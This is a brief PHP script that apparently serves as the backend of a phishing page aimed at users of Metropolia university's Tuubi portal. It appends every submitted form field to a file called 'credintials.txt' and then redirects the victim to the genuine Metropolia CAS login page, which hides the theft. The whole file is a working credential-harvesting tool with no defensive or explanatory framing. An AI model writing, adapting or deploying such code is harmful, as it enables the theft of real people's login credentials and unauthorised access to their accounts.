<?php
$file = 'credintials.txt';
$content = file_get_contents($file);
$content .= implode(',', $_POST) . "\n";
file_put_contents($file, $content);

header('Location: https://idp.metropolia.fi/cas/login?service=https%3A%2F%2Ftuubi.metropolia.fi%2Fportal%2Fc%2Fportal%2Flogin%3Fredirect%3D%252Fportal%252Fgroup%252Ftuubi%26p_l_id%3D3234532');
die();